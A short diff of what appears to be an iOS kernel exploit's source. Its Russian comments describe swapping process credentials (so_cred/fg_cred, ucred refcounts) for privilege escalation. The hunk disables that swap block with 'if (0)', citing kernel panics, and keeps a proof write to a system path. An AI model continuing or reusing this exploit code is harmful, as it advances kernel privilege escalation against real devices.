@@ -8249,6 +8249,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     if (rootZVA && ucF) {
                         extern uint64_t rwSocketPcb;   // kutils.m / kexploit
                         kpNote(r, @"  [SELFSWAP] поиск so_cred/fg_cred на наших объектах");
+                        if (0) {  // 2.0.34: свапы вырезаны — cr_ref в RO-странице, подмена = zfree-паника
                         // 2.0.33 [SAFESWAP] — refcount-танец. Паники 13:10/13:28:
                         // zfree на живых cred: свап без crhold обнуляет счётчик.
                         // Счётчик = ucred_rw+0, а ucred_rw — тип 0x21, ПИШЕТСЯ.
@@ -8305,7 +8306,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             int fw = open("/private/var/mobile/kexproof-fg.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
                             if (fw >= 0) { close(fw); unlink("/private/var/mobile/kexproof-fg.txt"); }
                             close(tfd);
-                        }
+                        }                        }
+
                     }
                     }
                 }
